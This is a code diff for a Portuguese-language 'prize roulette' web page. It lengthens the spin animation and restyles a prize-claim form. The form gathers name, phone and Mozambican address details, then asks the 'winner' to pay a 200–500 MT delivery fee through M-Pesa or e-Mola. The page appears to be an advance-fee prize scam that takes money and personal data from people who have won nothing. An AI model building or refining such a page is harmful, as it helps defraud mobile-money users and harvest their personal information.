@@ -232,8 +232,9 @@ function spinRoulette() {
   currentPrize = prizes[winningIndex];
   
   const prizeDegree = 360 - (winningIndex * 30 + 15);
-  const totalDegrees = 2520 + prizeDegree;
+  const totalDegrees = 4320 + prizeDegree;
   
+  roulette.style.transition = 'transform 8s cubic-bezier(.17, .67, .12, .99)';
   roulette.style.transform = `rotate(${totalDegrees}deg)`;
 
   setTimeout(() => {
@@ -242,7 +243,7 @@ function spinRoulette() {
     
     playWinSound();
     showPrizeModal(currentPrize);
-  }, 5000);
+  }, 8000);
 }
 
 function showPrizeModal(prize) {
@@ -270,22 +271,22 @@ function showDeliveryForm() {
   
   modalBody.innerHTML = `
     <div class="modal-body-content">
-      <h2>🚚 Resgate do Prêmio</h2>
+      <h2 style="font-size: 1.3rem; margin-bottom: 15px;">🚚 Resgate do Prêmio</h2>
       
       <form id="delivery-form">
         <div class="form-group">
-          <label>Nome Completo</label>
-          <input type="text" id="user-name" required placeholder="Seu nome completo">
+          <label style="font-size: 0.95rem; margin-bottom: 6px;">Nome</label>
+          <input type="text" id="user-name" required placeholder="Seu nome" style="padding: 12px; font-size: 0.95rem;">
         </div>
         
         <div class="form-group">
-          <label>Número de Telefone</label>
-          <input type="tel" id="user-phone" required placeholder="84 1234567">
+          <label style="font-size: 0.95rem; margin-bottom: 6px;">Telefone</label>
+          <input type="tel" id="user-phone" required placeholder="84 1234567" style="padding: 12px; font-size: 0.95rem;">
         </div>
         
         <div class="form-group">
-          <label>Província</label>
-          <select id="user-province" required>
+          <label style="font-size: 0.95rem; margin-bottom: 6px;">Província</label>
+          <select id="user-province" required style="padding: 12px; font-size: 0.95rem;">
             <option value="">Selecione</option>
             <option value="Maputo Cidade">Maputo Cidade</option>
             <option value="Maputo Província">Maputo Província</option>
@@ -302,58 +303,58 @@ function showDeliveryForm() {
         </div>
         
         <div class="form-group">
-          <label>Cidade</label>
-          <input type="text" id="user-city" required placeholder="Sua cidade">
+          <label style="font-size: 0.95rem; margin-bottom: 6px;">Cidade</label>
+          <input type="text" id="user-city" required placeholder="Sua cidade" style="padding: 12px; font-size: 0.95rem;">
         </div>
         
         <div class="form-group">
-          <label>Bairro</label>
-          <input type="text" id="user-neighborhood" required placeholder="Seu bairro">
+          <label style="font-size: 0.95rem; margin-bottom: 6px;">Bairro</label>
+          <input type="text" id="user-neighborhood" required placeholder="Seu bairro" style="padding: 12px; font-size: 0.95rem;">
         </div>
         
-        <h3 style="margin: 30px 0 20px; color: #ffd700; font-size: 1.4rem;">Escolha a Taxa de Transporte</h3>
+        <h3 style="margin: 20px 0 12px; color: #ffd700; font-size: 1.1rem;">Taxa de Transporte</h3>
         
         <div class="delivery-options">
           <label class="delivery-option">
             <input type="radio" name="delivery" value="200" onclick="selectDelivery(this)">
             <div class="delivery-info">
-              <div class="delivery-price">200MT</div>
-              <div class="delivery-time">Recebe o prêmio na sua casa em 14 dias</div>
+              <div class="delivery-price" style="font-size: 1.1rem;">200MT</div>
+              <div class="delivery-time" style="font-size: 0.9rem;">Recebe o prêmio na sua casa em 14 dias</div>
             </div>
           </label>
           
           <label class="delivery-option">
             <input type="radio" name="delivery" value="300" onclick="selectDelivery(this)">
             <div class="delivery-info">
-              <div class="delivery-price">300MT</div>
-              <div class="delivery-time">Recebe o prêmio na sua casa em 6 dias</div>
+              <div class="delivery-price" style="font-size: 1.1rem;">300MT</div>
+              <div class="delivery-time" style="font-size: 0.9rem;">Recebe o prêmio na sua casa em 6 dias</div>
             </div>
           </label>
           
           <label class="delivery-option">
             <input type="radio" name="delivery" value="500" onclick="selectDelivery(this)">
             <div class="delivery-info">
-              <div class="delivery-price">500MT</div>
-              <div class="delivery-time">Recebe o prêmio na sua casa em 3 dias</div>
+              <div class="delivery-price" style="font-size: 1.1rem;">500MT</div>
+              <div class="delivery-time" style="font-size: 0.9rem;">Recebe o prêmio na sua casa em 3 dias</div>
             </div>
           </label>
         </div>
         
-        <div id="payment-section" style="display: none; margin-top: 30px;">
-          <h3 style="margin: 0 0 20px; color: #ffd700; font-size: 1.4rem;">Pagar com:</h3>
+        <div id="payment-section" style="display: none; margin-top: 20px;">
+          <h3 style="margin: 0 0 12px; color: #ffd700; font-size: 1.1rem;">Pagar com:</h3>
           
           <div class="payment-options">
             <button type="button" class="payment-option" onclick="processPaymentDirect('mpesa')">
               <div class="payment-info">
-                <img src="mpesaicon.jpeg" alt="M-Pesa" class="payment-option-icon">
-                <div class="payment-name">M-Pesa</div>
+                <img src="mpesaicon.jpeg" alt="M-Pesa" class="payment-option-icon" style="width: 50px; height: 50px; padding: 10px;">
+                <div class="payment-name" style="font-size: 1rem;">M-Pesa</div>
               </div>
             </button>
             
             <button type="button" class="payment-option" onclick="processPaymentDirect('emola')">
               <div class="payment-info">
-                <img src="emolaIcone.png" alt="e-Mola" class="payment-option-icon">
-                <div class="payment-name">e-Mola</div>
+                <img src="emolaIcone.png" alt="e-Mola" class="payment-option-icon" style="width: 50px; height: 50px; padding: 10px;">
+                <div class="payment-name" style="font-size: 1rem;">e-Mola</div>
               </div>
             </button>
           </div>
